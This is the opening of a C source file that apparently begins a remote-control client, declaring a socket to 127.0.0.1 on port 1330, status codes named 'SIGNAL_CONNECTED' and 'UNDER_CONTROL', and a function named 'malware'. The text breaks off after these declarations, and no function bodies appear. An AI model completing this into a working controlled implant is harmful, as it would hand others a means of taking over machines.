#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/stat.h>

#define SOCKET_IP_ADDRESS "127.0.0.1"
#define SOCKET_PORT 1330

#define SIGNAL_CONNECTED "0x001"
#define UNDER_CONTROL   "0x003"

int socket_desc;
struct sockaddr_in server;
char server_reply[10000];

void malware();

